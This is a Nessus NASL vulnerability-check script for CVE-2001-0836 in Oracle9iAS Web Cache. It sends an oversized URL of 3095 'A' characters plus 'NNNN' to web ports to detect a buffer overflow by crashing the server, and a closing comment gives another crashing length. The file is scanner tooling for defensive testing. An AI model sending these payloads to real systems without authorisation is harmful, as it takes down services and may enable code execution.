#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#
# References:
# Date:  Thu, 18 Oct 2001 16:16:20 +0200
# From: "andreas junestam" <andreas.junestam@defcom.com>
# Affiliation: Defcom
# To: "bugtraq" <bugtraq@securityfocus.com>
# Subject: def-2001-30
#
# Affected:
# Oracle9iAS Web Cache/2.0.0.1.0
# 

if(description)
{
 script_id(11081);
 script_version ("$Revision: 1.15 $");

 script_cve_id("CVE-2001-0836");
 script_bugtraq_id(3443);
 script_xref(name:"OSVDB", value:"5534");

 name["english"] = "Oracle9iAS too long URL";
 name["francais"] = "URL trop longue contre Oracle9iAS";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It may be possible to make the Oracle9i application server
crash or execute arbitrary code by sending it a too long url
specially crafted URL.

Risk factor : High

Solution : Upgrade your server.";

 script_description(english:desc["english"]);
 
 summary["english"] = "Oracle9iAS buffer overflow";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "Databases";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 1100, 4000, 4001, 4002);
 exit(0);
}

#
include("http_func.inc");
include("misc_func.inc");

ports = add_port_in_list(list:get_kb_list("Services/www"), port:1100);
ports = add_port_in_list(list:ports, port:4000);
ports = add_port_in_list(list:ports, port:4001);
ports = add_port_in_list(list:ports, port:4002);

foreach port (ports)
{
 if(!http_is_dead(port:port))
 {
 url = string("/", crap(data: "A", length: 3095), crap(data: "N", length: 4));
 soc = http_open_socket(port);
 if(soc)
  {
  r = http_get(item: url, port: port);
  send(socket:soc, data:r);
  a = http_recv(socket: soc);
  http_close_socket(soc);

  if(http_is_dead(port: port, retry:1)) {
	security_hole(port);
	set_kb_item(name:"www/too_long_url_crash", value:TRUE);
   }
  }
 }
}

# Note: sending 'GET /<3571 x A> HTTP/1.0' will kill it too.
